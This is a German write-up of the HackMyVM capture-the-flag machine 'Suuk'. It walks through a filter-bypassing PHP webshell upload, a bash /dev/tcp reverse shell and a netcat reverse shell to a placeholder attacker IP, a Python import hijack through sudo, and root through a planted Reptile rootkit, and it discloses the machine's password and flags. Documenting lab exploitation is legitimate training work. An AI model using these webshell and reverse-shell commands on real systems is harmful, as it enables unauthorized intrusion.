# Suuk - HackMyVM (Medium)
 
![Suuk.png](Suuk.png)

## Übersicht

*   **VM:** Suuk
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Suuk)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 16. November 2022
*   **Original-Writeup:** https://alientec1908.github.io/Suuk_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Suuk"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), der ein Datei-Upload-Formular unter `/upload/` bereitstellte. Durch Umbenennen einer PHP-Webshell (`hackerBen.php`) in `exploit.php.png` konnte der Upload-Filter umgangen werden, was zu Remote Code Execution (RCE) als `www-data` führte. Eine Reverse Shell wurde etabliert. Die Bash-History des `www-data`-Benutzers enthielt Hinweise auf ein Verzeichnis `/home/tignasse` und eine Datei `pass.txt`. Durch Verwendung von `less` konnte das Passwort `716n4553` für den Benutzer `tignasse` ausgelesen werden. Als `tignasse` zeigte `sudo -l`, dass ein Python-Skript (`/opt/games/game.py`) als Benutzer `mister_b` ausgeführt werden durfte. Durch Python Path Hijacking (Erstellen einer bösartigen `random.py` im Verzeichnis `/opt/games`) wurde eine Shell als `mister_b` erlangt. Die User-Flag wurde in dessen Home-Verzeichnis gefunden. Die Privilegieneskalation zu Root erfolgte durch die Entdeckung eines Reptile-Rootkits im Verzeichnis `/reptile` (Hinweis aus der `.bash_history` von `www-data`), dessen Befehl `/reptile/reptile_cmd root` direkt eine Root-Shell gewährte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `vi` / `nano`
*   `mv`
*   `nc` (netcat)
*   `python3`
*   `stty`
*   `find`
*   `less`
*   `su`
*   `sudo`
*   `cat`
*   `export`
*   `ps`
*   `mkdir`
*   `echo`
*   `ssh`
*   `reptile_cmd`
*   Standard Linux-Befehle (`ls`, `cd`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Suuk" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.119`).
    *   `nmap`-Scan identifizierte offene Ports: 22 (SSH - OpenSSH 7.9p1) und 80 (HTTP - Apache 2.4.38 mit Titel "Formulaire d'upload de fichiers").
    *   `gobuster` auf Port 80 fand das Verzeichnis `/upload/`.

2.  **Initial Access (Webshell Upload & Reverse Shell):**
    *   Erstellung einer PHP-Webshell (`hackerBen.php` mit `echo system($GET["cmd"]);`).
    *   Umbenennung der Webshell zu `exploit.php.png` zur Umgehung von Upload-Filtern.
    *   Erfolgreicher Upload der `exploit.php.png` über das Formular unter `/upload/`.
    *   Bestätigung der RCE durch Aufruf von `http://192.168.2.119/upload/exploit.php.png?cmd=id` (Ausgabe als `www-data`).
    *   Etablierung einer Reverse Shell als `www-data` mittels eines Bash-Payloads (`/bin/bash -c 'bash -i >& /dev/tcp/[Angreifer-IP]/9001 0>&1'`) über die Webshell.
    *   Stabilisierung der Reverse Shell.

3.  **Privilege Escalation (von `www-data` zu `tignasse`):**
    *   Analyse der `.bash_history` des `www-data`-Benutzers enthielt Hinweise auf `/home/tignasse/pass.txt` und `/reptile`.
    *   Wechsel zu `/home/tignasse`. Die Datei `.pass.txt` wurde gefunden.
    *   `cat .pass.txt` zeigte "Try harder !".
    *   `less .pass.txt` offenbarte das Passwort `716n4553` (versteckt durch Steuerzeichen).
    *   Wechsel zum Benutzer `tignasse` mittels `su tignasse` und dem Passwort `716n4553`.

4.  **Privilege Escalation (von `tignasse` zu `mister_b`):**
    *   `sudo -l` als `tignasse` zeigte: `(mister_b) NOPASSWD: /usr/bin/python /opt/games/game.py`.
    *   Analyse von `/opt/games/game.py` zeigte den Import von `random`.
    *   Erstellung einer bösartigen `/opt/games/random.py` (Python Path Hijacking), die eine Netcat-Reverse-Shell (`nc [Angreifer-IP] 1337 -e /bin/bash`) startete.
    *   Ausführung von `sudo -u mister_b /usr/bin/python /opt/games/game.py` als `tignasse` löste die bösartige `random.py` aus.
    *   Erlangung einer Reverse Shell als `mister_b`.
    *   Einrichtung von SSH-Zugriff für `mister_b` durch Hinzufügen des Angreifer-SSH-Public-Keys zu `~/.ssh/authorized_keys`.
    *   User-Flag `Ciphura` in `/home/mister_b/user.txt` gelesen.

5.  **Privilege Escalation (von `mister_b` zu `root`):**
    *   Basierend auf dem Hinweis aus der `.bash_history` von `www-data` wurde das Verzeichnis `/reptile` untersucht.
    *   Ausführung des Befehls `/reptile/reptile_cmd root` (Teil des Reptile-Rootkits).
    *   Erlangung einer Root-Shell.
    *   Root-Flag `Warulli` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Unsicherer Datei-Upload:** Umgehung von Dateityp-Filtern durch doppelte Endungen (`.php.png`) führte zu RCE.
*   **Informationsleck in `.bash_history`:** Enthielt Hinweise auf interessante Verzeichnisse und Dateinamen.
*   **Passwörter in Klartextdateien (mit Steuerzeichen versteckt):** Ein Passwort wurde in einer Textdatei gespeichert und war nur mit `less` (nicht `cat`) vollständig sichtbar.
*   **Unsichere `sudo`-Konfiguration (Python Path Hijacking):** Die Erlaubnis, ein Python-Skript als anderer Benutzer auszuführen, in Kombination mit Schreibrechten im Verzeichnis des Skripts, ermöglichte das Hijacking von Modul-Importen zur Codeausführung.
*   **Vorhandenes Rootkit (Reptile):** Ein installiertes Rootkit bot einen direkten Befehl zur Erlangung von Root-Rechten.

## Flags

*   **User Flag (`/home/mister_b/user.txt`):** `Ciphura`
*   **Root Flag (`/root/root.txt`):** `Warulli`

## Tags

`HackMyVM`, `Suuk`, `Medium`, `File Upload Vulnerability`, `RCE`, `Bash History`, `Python Path Hijacking`, `sudo Exploitation`, `Rootkit`, `Reptile`, `Linux`, `Web`, `Privilege Escalation`
